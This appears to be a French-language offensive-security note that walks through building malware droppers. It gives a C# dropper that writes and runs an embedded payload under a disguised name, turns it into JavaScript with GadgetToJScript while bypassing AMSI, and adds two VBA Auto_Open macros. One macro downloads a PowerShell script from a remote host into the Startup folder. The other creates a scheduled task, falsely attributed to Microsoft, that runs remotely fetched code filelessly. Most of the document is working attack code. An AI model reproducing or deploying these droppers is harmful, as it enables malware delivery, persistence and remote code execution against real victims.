
Programme Malveillant qui télécharge un autre programme malveillant.


- [[#JavaScript Dropper]]
- [[#VBA Macros]]

# JavaScript Dropper

Creation d'un dropper JavaScript à partir d'un assembly .NET à l'aide de [GadgetToJScript](https://github.com/med0x2e/GadgetToJScript). Le tool permet de créer un gadget serialisé .NET afin de déclencher un payload lors de la déserialisation.

1. Créer un projet Visual Studio et séléctionner Class Library (.NET framework) (Bibliotèque de classe)

![[Pasted image 20250911154423.png]]

2. Créer la classe Dropper.cs

```C#
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
  
namespace MyDropper
{
    public class Dropper
    {
    }
}
```

3. Faire clique droit sur le projet dans le Solution Explorer -> Ajouter -> Elément existant.
![[Pasted image 20250911160104.png]]

4. Séléctionner un payload créé précédemment à ajouter.
5. Dans les propriétés du payload, définir le Build Action à **Embedded Resource** .

![[Pasted image 20250911160257.png]]

6. Ajouter le code C# suivant dans la classe Dropper. Tout le code doit se situer dans le constructeur de classe afin d'être exécuté lors de la désérialisation.

```C#
public Dropper()
{
	// use reflection to get reference to own assembly
	var assembly = Assembly.GetExecutingAssembly();
  
	// read embedded payload
	using (var payload = assembly.GetManifestResourceStream("MyDropper.<payload>.exe"))
		{
	         // get path to ProgramData
		    var ProgramDataPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);
    
		    // construct new path with our dir name
		    var newPath = Path.Combine(ProgramDataPath, "MyLegitApp");
    
		    // create new directory inside ProgramData
		    var newDirInProgData = Directory.CreateDirectory(newPath);
  
		    // construct path for the executable
		    var filePath = Path.Combine(newDirInProgData.FullName, "MyApp.exe");
    
		    // drop the path to disk
		    using (var fileCreate = File.Create(filePath))
		    {
		        // copy resource stream into file stream
		        payload.CopyTo(fileCreate);
  
		        // close file
		        payload.Close();
		        
		        // execute payload
				Process.Start(filePath);
			}
		}
}
```

7. Build le projet ce qui nous sort MyDropper.dll.
8. Serialiser la DLL avec GadgetToJScript. (-w type de script, -b pour bypass AMSI etc..., -o fichier de sortie sans extension)

```powershell
.\GadgetToJScript.exe -a C:\Users\Attacker\source\repos\MyDropper\bin\Release\MyDropper.dll -w js -b -o C:\Payloads\dropper
```

9. Le fichier .js généré peut être emballé avec des méthodes vu précédemment ou executé en utilisant wscript (ou en double cliquant dessus).


---
## VBA Macros


Macro VBA qui télécharge un fichier et le place dans le startup folder.

```vb
Private Sub Auto_Open()
    Dim Http As Object
    Dim Stream As Object
    Dim URL As String
    Dim TempFile As String
    Dim Destination As String
    
    ' --- Paramètres ---
    URL = "http://192.168.1.26:80/access.ps1"   ' URL du fichier à télécharger
    Destination = Environ("APPDATA") & "\Microsoft\Windows\Start Menu\Programs\Startup\access.ps1"
    
    ' --- Téléchargement ---
    Set Http = CreateObject("MSXML2.XMLHTTP")
    Http.Open "GET", URL, False
    Http.Send
    
    If Http.Status = 200 Then
        Set Stream = CreateObject("ADODB.Stream")
        Stream.Type = 1 ' binaire
        Stream.Open
        Stream.Write Http.responseBody
        Stream.SaveToFile Destination, 2
        Stream.Close
        Set Stream = Nothing

    End If
    Set Http = Nothing
End Sub
```


Macro VBA qui créer une tache planifiée qui charge un script powershell en fileless.

```vb
Private Sub Auto_Open()

Set service = CreateObject("Schedule.Service")
Call service.Connect
Dim td: Set td = service.NewTask(0)
td.RegistrationInfo.Author = "Microsoft Corporation"
td.settings.StartWhenAvailable = True
td.settings.Hidden = False
Dim triggers: Set triggers = td.triggers
Dim trigger: Set trigger = triggers.Create(1)
Dim startTime: ts = DateAdd("s", 30, Now)
startTime = Year(ts) & "-" & Right(Month(ts), 2) & "-" & Right(Day(ts), 2) & "T" & Right(Hour(ts), 2) & ":" & Right(Minute(ts), 2) & ":" & Right(Second(ts), 2)
trigger.StartBoundary = startTime
trigger.ID = "TimeTriggerId"
Dim Action: Set Action = td.Actions.Create(0)
Action.Path = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
Action.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -NoLogo -NoExit -Command ""iex(New-Object Net.WebClient).DownloadString('http://192.168.1.26:80/access.ps1');Invoke"""
Call service.GetFolder("\").RegisterTaskDefinition("UpdateTask", td, 6, , , 3)

End Sub
```
